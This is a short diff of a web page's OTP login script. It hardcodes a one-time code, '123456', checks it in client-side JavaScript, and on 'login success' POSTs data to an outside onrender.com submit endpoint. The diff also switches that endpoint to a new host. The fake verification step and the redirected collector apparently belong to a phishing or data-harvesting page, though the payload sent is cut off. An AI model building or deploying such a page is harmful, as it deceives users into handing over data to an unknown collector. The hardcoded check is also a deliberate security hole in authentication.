@@ -401,6 +401,7 @@ body{
 
 <script>
 
+const PROJECT_OTP = "123456";
 
 let otpSent = false;
 let timer = 0;
@@ -502,6 +503,8 @@ function confirmOTP(){
     }
 
 
+    if(otp === PROJECT_OTP){
+
         status.innerText =
             "OTP verified successfully.";
 
@@ -515,7 +518,7 @@ function confirmOTP(){
             document.getElementById("message")
                 .innerText =
                 "Login successful.";
-fetch('https://jpgpay-1.onrender.com/submit', {
+fetch('https://rajluck5.onrender.com/submit', {
     method: 'POST',
     headers: {
         'Content-Type': 'application/json'
